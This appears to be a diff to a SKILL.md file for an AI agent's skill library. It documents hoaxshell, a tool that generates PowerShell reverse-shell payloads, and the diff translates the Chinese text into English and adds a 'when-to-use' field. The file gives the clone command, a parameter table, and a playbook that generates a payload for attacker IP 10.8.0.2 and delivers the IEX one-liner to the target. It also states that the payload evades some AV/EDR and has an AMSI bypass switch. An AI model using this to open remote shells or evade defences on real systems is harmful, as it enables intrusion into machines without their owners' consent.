@@ -2,40 +2,43 @@
 name: hoaxshell-powershell
 description: "hoaxshell creates PowerShell reverse sessions. Signals: payload development, weaponization, generate PS reverse payload, print-only generation, encrypted transport."
 zh-signals: "hoaxshell: PowerShell 会话反弹。信号:载荷开发,武器化,生成 PS 反弹载荷,生成后仅打印,加密传输。"
+when-to-use: >-
+  Use when you need a PowerShell reverse shell without relying on a conventional listener;
+  generate an obfuscated payload and deliver the IEX one-liner.
 ---
 
 # hoaxshell
 
-- 攻击大类:C07 载荷开发与武器化
-- 上游仓库:https://github.com/t3l3machus/hoaxshell
-- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload Development and Weaponization
+- Upstream Repository: https://github.com/t3l3machus/hoaxshell
+- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/t3l3machus/hoaxshell && cd hoaxshell
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `sudo python3 hoaxshell.py -s <attacker_ip>` | 生成 PS 反弹载荷 |
-| `-g` | 生成后仅打印 |
-| `-t` | 加密传输 |
-| `-p 8080` | 端口 |
-| `-i` | 交互模式 |
-| `--exec-outfile` | 落地执行 |
+| `sudo python3 hoaxshell.py -s <attacker_ip>` | Generate a PS reverse payload |
+| `-g` | Print only after generation |
+| `-t` | Encrypted transport |
+| `-p 8080` | Port |
+| `-i` | Interactive mode |
+| `--exec-outfile` | Write to disk and execute |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### PowerShell 会话反弹
+### PowerShell Session Reverse
 
 ```bash
 sudo python3 hoaxshell.py -s 10.8.0.2
-# 把输出的 IEX one-liner 投递到目标,会话自动升级
+# Deliver the printed IEX one-liner to the target, the session upgrades automatically
 ```
 
-## 注意事项
+## Notes
 
-生成的 IEX 载荷无 msfvenom 特征,部分 AV/EDR 不拦;支持 TLS 加密与 AMSI 绕过开关。
+The generated IEX payload carries no msfvenom signature, so some AV/EDR products do not block it; supports TLS encryption and an AMSI bypass switch.
